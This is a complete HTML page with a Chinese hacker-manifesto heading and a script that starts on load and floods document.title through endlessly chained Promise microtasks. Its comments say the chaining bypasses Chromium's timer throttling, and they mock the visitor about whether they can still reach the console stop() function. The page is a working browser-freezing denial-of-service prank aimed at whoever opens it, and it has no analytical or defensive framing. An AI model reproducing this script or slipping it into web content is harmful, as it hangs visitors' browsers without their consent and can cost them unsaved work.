<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>MAX</title>
<style>
body {
  background:#000;
  color:rgb(255, 255, 255);
  font-family: monospace;
  text-align:center;
  padding-top:50px;
}
</style>
</head>

<body>
<h1>你说我们是罪犯，而你们却建造原子弹，发动战争，你杀人，欺骗</h1>

<script>
let running = true;
let i = 0;

function flood() {
  if (!running) return;

  // 每个事件循环都改一次 title
  document.title = "X" + (i++) + Math.random().toString(36);

  // microtask 连锁，绕过 Chromium 的 interval 节流
  Promise.resolve().then(flood);
}

// 页面加载完成就自动开始
window.addEventListener("load", () => {
  flood();
});

// 你可以在控制台执行 stop() 来救自己（如果还能点得到）
function stop() {
  running = false;
}
</script>
</body>
</html>
